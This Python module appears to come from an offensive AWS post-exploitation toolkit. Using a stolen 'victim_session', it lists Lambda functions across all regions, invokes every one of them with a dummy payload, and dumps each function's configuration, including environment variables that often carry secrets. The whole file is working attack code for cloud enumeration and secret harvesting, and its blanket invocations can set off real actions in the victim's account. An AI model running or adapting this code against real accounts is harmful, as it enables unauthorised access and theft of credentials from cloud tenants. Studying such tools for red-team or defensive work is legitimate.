from colorama import Fore
import json,sys
from modules.utils import custom_serializer
import modules.globals as my_globals
from botocore.client import Config

def lambda_init_enum(victim_session, attacker_session):
    list_lambda_functions(victim_session)

def invoke_lambda_function(lambda_client, function, region):
    try:
        payload = {"key1": "value1"}
        response = lambda_client.invoke(
            FunctionName=f"{function['FunctionName']}",
            InvocationType='RequestResponse',
            LogType='Tail',
            Payload=json.dumps(payload),
            Qualifier=function.get('Version', '$LATEST')
        )
        response_payload = json.loads(response['Payload'].read().decode('utf-8'))
        print(
            f"{Fore.MAGENTA}\nRegion: {region} | Function: {function['FunctionName']} | \nResponse:\n {json.dumps(response_payload, indent=4, sort_keys=True, default=custom_serializer)}")
    except KeyboardInterrupt:
        raise
    except:
        print(f"{Fore.LIGHTBLACK_EX}Failed to invoke Lambda functions")

def get_environment_variables(lambda_client, function, region):
    try:
        response = lambda_client.get_function_configuration(FunctionName=f"{function['FunctionName']}")
        print(
            f"{Fore.YELLOW}\nRegion: {region} | Function: {function['FunctionName']} | \nConfiguration:\n"
            f"{json.dumps(response, indent=4, sort_keys=True, default=custom_serializer)}"
        )
    except KeyboardInterrupt:
        raise
    except Exception as e:
        print(f"{Fore.LIGHTBLACK_EX}Failed to get Lambda function configuration for: {function['FunctionName']} \n {e}")

def list_lambda_functions(victim_session):
    print(f"{Fore.GREEN}Enumerating Lambda Functions...")
    for region in my_globals.aws_regions:
        try:
            lambda_client = victim_session.client("lambda", region_name=region, config=Config(read_timeout=10, connect_timeout=10))
            functions = lambda_client.list_functions().get("Functions", [])
            for function in functions:
                print(f"{Fore.MAGENTA}Region: {region} | Function: {function['FunctionName']} | Runtime: {function['Runtime']}")
                invoke_lambda_function(lambda_client, function, region)
                get_environment_variables(lambda_client, function, region)
        except KeyboardInterrupt:
            raise
        except:
            sys.stdout.write("\r\033[K")  # \033[K clears from cursor to end of line
            sys.stdout.write(f"{Fore.LIGHTBLACK_EX}Failed to list Lambda functions in region {region}")
            sys.stdout.flush()
    print("")